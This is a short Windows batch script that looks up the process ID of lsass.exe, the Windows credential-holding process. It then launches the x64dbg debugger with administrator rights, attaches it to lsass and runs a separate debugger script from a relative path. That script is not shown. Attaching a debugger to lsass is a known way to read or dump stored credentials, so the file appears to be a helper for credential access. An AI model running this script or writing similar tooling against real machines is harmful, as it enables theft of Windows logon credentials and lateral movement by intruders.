@echo off
setlocal enabledelayedexpansion

set X64DBG_PATH="C:\Users\user\Downloads\snapshot_2025-08-19_19-40\release\x64\x64dbg.exe"

for /f "tokens=2 delims=," %%a in ('tasklist /fi "imagename eq lsass.exe" /fo csv /nh') do (
    set "LSASS_PID=%%~a"
    echo PID of lsass.exe: %%~a
)

:: Define the FILENAME of the script
set SCRIPT_PATH=\Users\user\Documents\dbg\x64\script.txt
set REAL_SCRIPT_PATH=..\..%SCRIPT_PATH%

:: Use the -WorkingDirectory parameter and pass only the filename to the -cf argument
powershell -Command "Start-Process -FilePath %X64DBG_PATH% -ArgumentList '-p', '!LSASS_PID!', '-cf', '%REAL_SCRIPT_PATH%' -Verb RunAs"

timeout /t 5 >nul